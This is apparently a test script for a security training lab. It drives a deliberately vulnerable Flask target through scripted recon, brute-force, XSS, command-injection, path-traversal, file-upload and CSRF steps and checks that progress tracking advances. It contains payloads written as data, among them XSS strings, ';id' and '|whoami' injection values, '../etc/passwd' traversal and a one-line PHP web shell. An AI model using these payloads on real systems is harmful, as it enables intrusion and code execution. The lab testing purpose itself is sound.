"""
verify_operator_progress_per_step.py — End-to-end proof that EVERY operator-mode
step makes observable progress, for EVERY module.

For each of the 7 modules (recon, brute_force, xss, cmd_injection,
dir_traversal, file_upload, csrf) this script:

  1. Boots target-agent's Flask routes in-process (no Docker).
  2. Stamps every request with an AttackBox User-Agent so events are
     tagged via=attackbox and count toward operator-mode progress.
  3. Walks the module's operator-ladder steps in order. After each step
     it computes operator-mode progress and prints:
       - the new progress_percent
       - which tasks just flipped to "complete"
       - per-task match_count progress (matters for `min_count` rungs
         where progress is incremental but doesn't move the % bar until
         the threshold is crossed)
  4. Asserts the module reaches 100% by the end and that progress
     is monotonically non-decreasing.

Run:
    python scripts/verify_operator_progress_per_step.py
"""
from __future__ import annotations

import io
import os
import sys
import tempfile

# Force UTF-8 console (Windows cp1256/cp1252 can't encode Δ, →, etc.)
try:
    sys.stdout.reconfigure(encoding="utf-8")  # type: ignore[attr-defined]
    sys.stderr.reconfigure(encoding="utf-8")  # type: ignore[attr-defined]
except Exception:
    pass
import time
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "target-agent" / "app"))
sys.path.insert(0, str(ROOT / "red-team"))


# ── Pre-flight: prepare a writable BASE_DIR before importing routes.files ─────
# routes/files.py does os.makedirs("/app/static/uploads/") at import time,
# which fails on Windows. We pre-emptively patch os.makedirs and builtins.open
# during the import, then redirect the module's path constants to a temp dir.
_TMP_ROOT = Path(tempfile.mkdtemp(prefix="attense_perstep_"))
_TMP_BASE = _TMP_ROOT / "static"
_TMP_UPLOADS = _TMP_BASE / "uploads"
_TMP_ETC = _TMP_ROOT / "etc"
_TMP_BASE.mkdir(parents=True, exist_ok=True)
_TMP_UPLOADS.mkdir(parents=True, exist_ok=True)
_TMP_ETC.mkdir(parents=True, exist_ok=True)
(_TMP_BASE / "readme.txt").write_text("ATTENSE Lab Target - static readme\n")
(_TMP_ETC / "passwd").write_text(
    "root:x:0:0:root:/root:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n"
    "nobody:x:65534:65534:nobody:/nonexistent:/bin/sh\n"
)

# Patch import-time side effects in routes.files
_original_makedirs = os.makedirs
def _safe_makedirs(p, *a, **kw):
    try:
        return _original_makedirs(p, *a, **kw)
    except Exception:
        return None
os.makedirs = _safe_makedirs  # type: ignore

_original_open = open  # noqa: A001
def _safe_open(path, mode="r", *args, **kwargs):
    # If routes/files.py tries to write the seed readme to /app/static/...
    # silently divert to a tempfile so import doesn't crash.
    try:
        return _original_open(path, mode, *args, **kwargs)
    except (FileNotFoundError, PermissionError, OSError):
        if "w" in mode or "a" in mode:
            return io.StringIO()
        return io.StringIO("")

import builtins as _b
_b.open = _safe_open  # type: ignore

import socket as _socket
from flask import Flask, request

import evidence as target_evidence            # noqa: E402
from routes.auth    import auth_bp            # noqa: E402
from routes.home    import home_bp            # noqa: E402
from routes.search  import search_bp          # noqa: E402
from routes.system  import system_bp          # noqa: E402
import routes.files as _files_mod             # noqa: E402
import routes.system as _system_mod           # noqa: E402
from routes.files   import files_bp           # noqa: E402
from routes.profile import profile_bp         # noqa: E402

# Restore originals
os.makedirs = _original_makedirs  # type: ignore
_b.open = _original_open  # type: ignore

# Redirect file-route path constants to our temp tree
_files_mod.BASE_DIR    = str(_TMP_BASE) + os.sep
_files_mod.UPLOAD_DIR  = str(_TMP_UPLOADS) + os.sep


# ── Build the Flask app (mirrors target-agent/app/main.py) ─────────────────
app = Flask(__name__)
app.secret_key = "lab-secret-123"

_ATTACKBOX_IPS: set[str] = set()


def detect_via() -> str:
    try:
        ua = (request.headers.get("User-Agent") or "")
        prefix = (request.headers.get("X-Forwarded-Prefix") or "").rstrip("/")
        ip = request.remote_addr or ""
        if "AttenseAttackBox" in ua:
            return "attackbox"
        if ip in _ATTACKBOX_IPS:
            return "attackbox"
        if prefix == "/target":
            return "browser"
    except RuntimeError:
        pass
    return "unknown"


def lab_url(path: str) -> str:
    if path is None:
        path = "/"
    if not str(path).startswith("/"):
        path = "/" + str(path)
    try:
        prefix = request.headers.get("X-Forwarded-Prefix", "").rstrip("/")
    except RuntimeError:
        prefix = ""
    return f"{prefix}{path}"


app.detect_via = detect_via
app.lab_url = lab_url


@app.context_processor
def _inject_lab_url():
    return {"lab_url": lab_url}


app.register_blueprint(home_bp)
app.register_blueprint(auth_bp,    url_prefix="/auth")
app.register_blueprint(search_bp)
app.register_blueprint(system_bp,  url_prefix="/system")
app.register_blueprint(files_bp,   url_prefix="/files")
app.register_blueprint(profile_bp, url_prefix="/profile")


from backend import lab_progress  # noqa: E402


def _local_fetch_events(since=0.0, module_id=None, limit=500):
    return target_evidence.list_events(since=since, module_id=module_id, limit=limit)


lab_progress.fetch_events = _local_fetch_events


# ── Stamp every test-client request with the AttackBox UA ──────────────────
ATTACKBOX_HEADERS = {"User-Agent": "AttenseAttackBox/1.0"}


# ── Per-module step plans ──────────────────────────────────────────────────
def _make_steps():
    """Returns OrderedDict: module_id -> list[(label, callable(client))]."""
    steps = {}

    # ── recon ──────────────────────────────────────────────────────────────
    steps["recon"] = [
        ("GET /                              (portal_visited)",
         lambda c: c.get("/", headers=ATTACKBOX_HEADERS)),
        ("GET /search?q=hello                (area 1: search_used)",
         lambda c: c.get("/search?q=hello", headers=ATTACKBOX_HEADERS)),
        ("GET /system/ping?host=127.0.0.1    (area 2: diagnostics_used)",
         lambda c: c.get("/system/ping?host=127.0.0.1", headers=ATTACKBOX_HEADERS)),
        ("GET /files/read?path=readme.txt    (area 3: file_viewer_used)",
         lambda c: c.get("/files/read?path=readme.txt", headers=ATTACKBOX_HEADERS)),
        ("GET /files/upload                  (area 4: file_upload_used → recon_sequence_observed fires)",
         lambda c: c.get("/files/upload", headers=ATTACKBOX_HEADERS)),
        ("GET /robots.txt                    (hidden_clue_accessed)",
         lambda c: c.get("/robots.txt", headers=ATTACKBOX_HEADERS)),
    ]

    # ── brute_force ────────────────────────────────────────────────────────
    def login(c, u, p):
        return c.post("/auth/login",
                      data={"username": u, "password": p},
                      headers=ATTACKBOX_HEADERS)
    steps["brute_force"] = [
        ("POST /auth/login admin:wrong1     (probe — login_failed)",
         lambda c: login(c, "admin", "wrong1")),
        ("POST /auth/login admin:wrong2     (failure 2)",
         lambda c: login(c, "admin", "wrong2")),
        ("POST /auth/login admin:wrong3     (failure 3 → brute_force_pattern)",
         lambda c: login(c, "admin", "wrong3")),
        ("POST /auth/login admin:wrong4     (failure 4)",
         lambda c: login(c, "admin", "wrong4")),
        ("POST /auth/login admin:wrong5     (failure 5)",
         lambda c: login(c, "admin", "wrong5")),
        ("POST /auth/login admin:wrong6     (failure 6 → wordlist task min_count met)",
         lambda c: login(c, "admin", "wrong6")),
        ("POST /auth/login admin:password123 (credential_found)",
         lambda c: login(c, "admin", "password123")),
    ]

    # ── xss ────────────────────────────────────────────────────────────────
    steps["xss"] = [
        ("GET /search?q=hello                       (search_used)",
         lambda c: c.get("/search", query_string={"q": "hello"},
                          headers=ATTACKBOX_HEADERS)),
        ("GET /search?q=<script>alert(1)</script>   (xss_payload #1 + reflected)",
         lambda c: c.get("/search", query_string={"q": "<script>alert(1)</script>"},
                          headers=ATTACKBOX_HEADERS)),
        ("GET /search?q=<img src=x onerror=alert>   (xss_payload #2)",
         lambda c: c.get("/search", query_string={"q": "<img src=x onerror=alert(2)>"},
                          headers=ATTACKBOX_HEADERS)),
    ]

    # ── cmd_injection ──────────────────────────────────────────────────────
    # Patch os.popen INSIDE routes.system to return fake Linux ping output.
    # Real `ping -c 2` doesn't work on Windows, and `id` is not a real cmd
    # there, so we simulate the post-injection output a learner would see
    # against the production target-agent container.
    def _fake_popen(cmd):
        cmd_s = str(cmd)
        if ";" in cmd_s or "|" in cmd_s or "&&" in cmd_s or "$(" in cmd_s or "`" in cmd_s:
            # Simulated injected `id` output → triggers command_injection_detected
            output = (
                "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n"
                "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms\n"
                "uid=0(root) gid=0(root) groups=0(root)\n"
            )
        else:
            output = (
                "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n"
                "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms\n"
            )
        return io.StringIO(output)

    _system_mod.os.popen = _fake_popen  # patch only the route's os reference

    steps["cmd_injection"] = [
        ("GET /system/ping?host=127.0.0.1         (diagnostics_used)",
         lambda c: c.get("/system/ping?host=127.0.0.1",
                          headers=ATTACKBOX_HEADERS)),
        ("GET /system/ping?host=127.0.0.1;id      (separator #1)",
         lambda c: c.get("/system/ping",
                          query_string={"host": "127.0.0.1;id"},
                          headers=ATTACKBOX_HEADERS)),
        ("GET /system/ping?host=127.0.0.1|whoami  (separator #2 → injection confirmed)",
         lambda c: c.get("/system/ping",
                          query_string={"host": "127.0.0.1|whoami"},
                          headers=ATTACKBOX_HEADERS)),
    ]

    # ── dir_traversal ──────────────────────────────────────────────────────
    steps["dir_traversal"] = [
        ("GET /files/read?path=readme.txt          (file_viewer_used)",
         lambda c: c.get("/files/read",
                          query_string={"path": "readme.txt"},
                          headers=ATTACKBOX_HEADERS)),
        ("GET /files/read?path=../etc/passwd     (traversal #1 → sensitive_file_disclosed)",
         lambda c: c.get("/files/read",
                          query_string={"path": "../etc/passwd"},
                          headers=ATTACKBOX_HEADERS)),
        ("GET /files/read?path=..%2Fetc%2Fpasswd (traversal #2 — encoded variant)",
         lambda c: c.get("/files/read",
                          query_string={"path": "../etc/passwd"},
                          headers={**ATTACKBOX_HEADERS,
                                   "X-Test-Variant": "url-encoded"})),
    ]

    # ── file_upload ────────────────────────────────────────────────────────
    def upload(c, name, data, ctype="text/plain"):
        return c.post(
            "/files/upload",
            data={"file": (io.BytesIO(data), name, ctype)},
            content_type="multipart/form-data",
            headers=ATTACKBOX_HEADERS,
        )
    steps["file_upload"] = [
        ("POST /files/upload notes.txt              (file_upload_used + file_saved)",
         lambda c: upload(c, "notes.txt", b"hello world")),
        ("POST /files/upload evidence.log           (file_saved #2)",
         lambda c: upload(c, "evidence.log", b"line1\nline2\n")),
        ("POST /files/upload shell.php              (dangerous_extension_accepted)",
         lambda c: upload(c, "shell.php",
                          b"<?php system($_GET['c']); ?>",
                          "application/x-php")),
    ]

    # ── csrf ───────────────────────────────────────────────────────────────
    def post_with_referer(c, url, data, referer=None):
        h = dict(ATTACKBOX_HEADERS)
        if referer:
            h["Referer"] = referer
        return c.post(url, data=data, headers=h)
    steps["csrf"] = [
        ("POST /auth/login admin:password123        (login_success)",
         lambda c: login(c, "admin", "password123")),
        ("POST /profile/update email=admin@lab.local (profile_update_used + csrf_token_missing)",
         lambda c: post_with_referer(c, "/profile/update",
                                      {"email": "admin@lab.local"})),
        ("POST /profile/update email=pwned@evil.lab (profile_changed_without_csrf)",
         lambda c: post_with_referer(c, "/profile/update",
                                      {"email": "pwned@evil.lab"})),
    ]

    return steps


# ── Pretty printing helpers ────────────────────────────────────────────────
def _hr(label, char="="):
    bar = char * (74 - len(label))
    print(f"\n{char*3} {label} {bar}")


def _summarize(progress):
    parts = []
    for i, t in enumerate(progress["tasks"], 1):
        check = "OK" if t["complete"] else "  "
        parts.append(f"[{check}] T{i} {t['match_count']}/{t['min_count']}")
    return "  ".join(parts)


def run_module(module_id, step_list, started_at):
    _hr(f"Module: {module_id}  ({len(step_list)} step(s))", char="=")
    target_evidence.reset()
    client = app.test_client()

    # Initial baseline
    p0 = lab_progress.compute(module_id, mission_started_at=started_at, mode="operator")
    print(f"  baseline:        progress = {p0['progress_percent']:>3}%   {_summarize(p0)}")

    last_pct = p0["progress_percent"]
    last_match = [t["match_count"] for t in p0["tasks"]]
    last_complete = set(p0["completed_tasks"])
    failures = []

    for idx, (label, action) in enumerate(step_list, 1):
        resp = action(client)
        # accept any 2xx/3xx/4xx; we only care about evidence emission
        p = lab_progress.compute(module_id, mission_started_at=started_at, mode="operator")
        new_complete = set(p["completed_tasks"]) - last_complete
        delta_pct = p["progress_percent"] - last_pct
        new_match = [t["match_count"] for t in p["tasks"]]
        match_deltas = [n - o for n, o in zip(new_match, last_match)]

        # Build a short delta tag
        delta_tag_parts = []
        if delta_pct > 0:
            delta_tag_parts.append(f"+{delta_pct}%")
        for ti, dm in enumerate(match_deltas, 1):
            if dm:
                delta_tag_parts.append(f"T{ti}+{dm}")
        delta_tag = "  ".join(delta_tag_parts) or "(no change)"

        print(f"  step {idx}/{len(step_list)} [HTTP {resp.status_code}]  "
              f"progress = {p['progress_percent']:>3}%   "
              f"Δ {delta_tag}")
        print(f"      {label}")
        if new_complete:
            for ti in sorted(new_complete):
                print(f"      → task {ti+1} just completed: {p['tasks'][ti]['title']}")

        # Monotonic non-decrease check
        if p["progress_percent"] < last_pct:
            failures.append(
                f"{module_id} step {idx}: progress regressed "
                f"{last_pct}% → {p['progress_percent']}%"
            )
        # Real progress check: every step must increase EITHER % OR a match_count
        if delta_pct == 0 and all(d == 0 for d in match_deltas):
            failures.append(
                f"{module_id} step {idx} ({label}) produced NO observable "
                f"progress (no % increase, no match-count increase)."
            )

        last_pct = p["progress_percent"]
        last_match = new_match
        last_complete = set(p["completed_tasks"])

    # Final state
    final = lab_progress.compute(module_id, mission_started_at=started_at, mode="operator")
    print(f"  final:           progress = {final['progress_percent']:>3}%   "
          f"success = {final['success']}   {_summarize(final)}")

    if final["progress_percent"] != 100:
        failures.append(
            f"{module_id}: final operator progress should be 100%, "
            f"got {final['progress_percent']}%"
        )

    return failures


def main():
    print("ATTENSE — per-step operator-mode progress verification")
    print(f"target-agent app: {ROOT / 'target-agent' / 'app'}")
    print(f"red-team backend: {ROOT / 'red-team'}")
    print(f"temp tree:        {_TMP_ROOT}")

    started_at = time.time() - 1.0
    plans = _make_steps()

    all_failures = []
    for module_id, step_list in plans.items():
        all_failures.extend(run_module(module_id, step_list, started_at))

    _hr("Summary", char="=")
    if all_failures:
        print(f"RESULT: FAIL ({len(all_failures)} issue(s))")
        for f in all_failures:
            print(f"  X {f}")
        sys.exit(1)
    print("RESULT: PASS — every operator-mode step in every module produced")
    print("              observable progress, and every module reached 100%.")


if __name__ == "__main__":
    main()
